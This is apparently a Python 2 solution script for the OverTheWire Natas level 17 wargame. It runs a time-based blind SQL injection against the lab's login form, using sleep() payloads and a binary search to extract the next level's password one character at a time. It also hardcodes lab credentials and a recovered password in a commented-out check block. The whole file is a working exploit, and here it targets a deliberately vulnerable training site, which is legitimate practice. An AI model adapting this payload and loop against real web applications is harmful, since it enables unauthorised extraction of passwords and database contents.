import requests
import base64
import time

passwd = ''
auth = 'Basic ' + base64.b64encode('natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

for i in range(1,33):
	st = 48
	en = 122
	while(True):
		mid = (st + en) / 2
		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
		t = time.time()
		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		t = time.time() - t
		if t > 1:
			t = time.time()
			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
			t = time.time() - t
			if t > 1:
				passwd += chr(mid)
				print "Password: " + passwd
				break
		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))	-- -'}
		t = time.time()
		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		t = time.time() - t
		if t > 1:
			t = time.time()
			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
			t = time.time() - t
			if t > 1:
				st = mid + 1
			else:
				en = mid - 1
		
				
#check password
# passwd = "xvjsqNnyvewUcwwgiklrjhpxUZsmxhdd"
# for m in range(1, 33):		
	# c = ord(passwd[m-1])
	# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(m) +',1))='+str(c)+',sleep(1),sleep(0))-- -'}
	# t = time.time()
	# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
	# t = time.time() - t
	# if t > 1:
		# print str(m) + " Ok"
	# else:
		# print str(m) + " Fail"
